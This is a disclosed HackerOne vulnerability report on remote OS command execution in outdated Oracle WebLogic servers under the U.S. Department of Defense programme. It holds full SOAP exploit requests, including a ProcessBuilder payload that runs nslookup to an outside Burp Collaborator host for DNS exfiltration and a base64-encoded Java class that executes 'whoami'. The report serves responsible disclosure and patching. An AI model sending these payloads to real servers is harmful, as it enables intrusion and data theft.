---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-10-08
submitted: 2019-07-03T19:21:18.673Z
bounty_usd: null
votes: 4
cve: "CVE-2017-10352"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/634630"
title: "Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ [CVE-2017-10352]"
---
# Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ [CVE-2017-10352]

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 4 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/634630](https://hackerone.com/reports/634630)
- CWE: OS Command Injection | CVE: CVE-2017-10352
- Submitted: 2019-07-03T19:21:18.673Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. I was able to identify 3 more RCE vulnerabilities due to the outdated Oracle Weblogic instance on the █████████, ███, █████
After my previous discoveries I decided to dig deeper into the `███.mil` scope/IP space and found other instances of vulnerable Oracle WebLogic. I decided to fill all this additional findings in the single report

##POC
This request to the https://█████████/wls-wsat/CoordinatorPortType will trigger sleep for 10 seconds (same applies for ████████, ███████):

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: █████████
Content-Length: 423
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>10000</long>
        </object>
      </java>  
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

The next request will resolve custom Burp Collaborator hostname via `nslookup` OS command to prove that it's possible to exfiltrate data via DNS:
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: ███
Content-Length: 724
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
			<java version="1.8.0_151" class="java.beans.XMLDecoder"> 
			<void class="java.lang.ProcessBuilder"> 
				<array class="java.lang.String" length="3">
				<void index = "0">
					<string>cmd</string>
				</void>
				<void index = "1"> 
					<string>/c</string> 
				</void>
				<void index = "2">
					<string>nslookup j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net</string>
				</void>
			</array>
			<void method="start"/>
			</void>
			</java>
			</work:WorkContext> 
	</soapenv:Header> 
<soapenv:Body/>
</soapenv:Envelope>
```


Note: to reproduce the second case with `nslookup`, `j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net` host should be replaced by your own Burp Collaborator instance to catch the DNS request

##Suggested fix
Patching WebLogic to the resent version will fix the issue.

## Impact

Remote OS command execution.

## Timeline

- **Report Filed**
- **2019-07-03** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-07-03** @sp1d3rs: P.S. In all #634630, #634593, #634625, #634612 RCE reports vulnerabilities described can be also chained with recent CVE-2019-2725 for gaining direct command output via response with nt-authority/system permissions (highest available):
█████████
In this POC `whoami` comand is executed:

POC for this one (for https://████████) :
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: ████
Content-Length: 5379
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
    <java>
    <class><string>org.slf4j.ext.EventData</string>
    <void>
    <string>
            <java>
                <void class="sun.misc.BASE64Decoder">
                    <void method="decodeBuffer" id="byte_arr">	<string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string>
                    </void>
                </void>
                <void class="org.mozilla.classfile.DefiningClassLoader">
                    <void method="defineClass">
                        <string>ResultBaseExec</string>
                        <object idref="byte_arr"></object>
                        <void method="newInstance">
                            <void method="do_exec" id="result">
                                <string>whoami</string>
                            </void>
                        </void>
                    </void>
                </void>
    
                <void class="java.lang.Thread" method="currentThread">
                    <void method="getCurrentWork" id="current_work">
                        <void method="getClass">
                            <void method="getDeclaredField">
                                <string>connectionHandler</string>
                                    <void method="setAccessible"><boolean>true</boolean></void>
                                <void method="get">
                                    <object idref="current_work"></object>
                                    <void method="getServletRequest">
                                        <void method="getResponse">
                                            <void method="getServletOutputStream">
                                                <void method="writeStream">
                                                    <object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object>
                                                    </void>
                                                <void method="flush"/>
                                                </void>
                                        <void method="getWriter"><void method="write"><string></string></void></void>
                                        </void>
                                    </void>
                                </void>
                            </void>
                        </void>
                    </void>
                </void>
            </java>
    </string>
    </void>
    </class>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
